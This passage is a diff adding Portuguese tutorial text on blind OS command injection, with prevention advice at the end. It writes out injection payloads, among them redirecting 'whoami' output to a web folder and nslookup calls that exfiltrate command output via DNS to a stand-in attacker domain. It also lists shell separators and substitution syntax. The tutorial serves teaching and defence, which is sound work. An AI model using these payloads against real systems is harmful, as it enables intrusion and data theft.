@@ -56,3 +56,58 @@ Você pode usar um comando injetado que irá executar um delay, permitindo assim
         & ping -c 10 127.0.0.1 &
         
 Esse comando irá causar na aplicação um loopback no adaptador de rede por 10 segundos. 
+
+<h2>Exploiting blind OS command injection by redirecting output</h2>
+
+Você pode redirecionar a saida do comando injetado para um arquivo dentro da pasta root que você pode que você pode ler atraves do navegador posteriormente. Por exemplo, se uma aplicação serve um recurso estático em um diretorio /var/www/static, então você pode enviar o seguinte comando:
+
+        & whoami > /var/www/static/whoami.txt &
+
+O caracter > envia a saida do whoami para o arquivo especificado. Você pode usar então o navegador para buscar https://vulnerable-website.com/whoami.txt e recuperar o arquivo com a saida do comando.
+
+<h2>Exploiting blind OS command injection using out-of-band (OAST) techniques</h2>
+
+Você pode usar o comando injetado que acionara um interação de rede out-of-band com um sistema que você controla, usando técnicas OAST. Por exemplo:
+
+        & nslookup kgji2ohoyw.web-attacker.com &
+        
+Esse payload usa o comando nslookup que faz uma consulta DNS para o dominio especificado. O atacante pode monitorar a ocorrencia da consulta solicitada, e assim verificar se o comando foi executado com sucesso.
+
+o canal fora de banda (out-of-band) também prove uma forma facil de exfiltrar a saida do comando injetado.
+
+        & nslookup `whoami`.kgji2ohoyw.web-attacker.com &
+        
+Isso irá causar uma consulta pelo DNS do sominio contento o resultado do comando whoami.
+
+        wwwuser.kgji2ohoyw.web-attacker.com
+        
+<h2>Maneiras de injetar comando de sistema</h2>
+
+Há uma variedades de comando que podem ser usados para o ataque de injeção.
+
+Vários caracteres funcionam como separadores de comandos, permitindo que os comandos sejam encadeados. Os seguintes separadores de comando funcionam em sistemas baseados em Windows e Unix:
+
+<li>&</li>
+<li>&&</li>
+<li>|</li>
+<li>||</li>
+
+Os seguintes comandos funcionam apenas em sistemas baseados em Unix:
+
+<li>;</li>
+<li>Newline (0x0a ou \n)</li>
+
+Ainda em sistemas Unix-like você pode usar o caracter dolar injetar comandos dentro do comando original:
+
+<li>`whoami`</li>
+<li>$(whoami)</li>
+
+Observe que os diferentes metacaracteres do shell têm comportamentos sutilmente diferentes que podem afetar se eles funcionam em determinadas situações e se permitem a recuperação na banda da saída do comando ou são úteis apenas para exploração do tipo blind.
+
+Às vezes, a entrada que você controla aparece entre aspas no comando original. Nessa situação, você precisa encerrar o contexto citado (usando " ou ') antes de usar metacaracteres do shell adequados para injetar um novo comando.
+
+<h2>Como previnir ataques de command Injection?</h2>
+
+A forma mais efetiva de previnir uma injeção de comandos é nunca chamar comandos da camada de aplicação. Existe maneiras alternativas para implementar essa funcionalidade usando plataformas de API segura.
+
+Nunca tente sanitizar a entrada escapando dos metacaracteres do shell. Na prática, isso é muito propenso a erros e vulnerável a ser contornado por um invasor habilidoso.
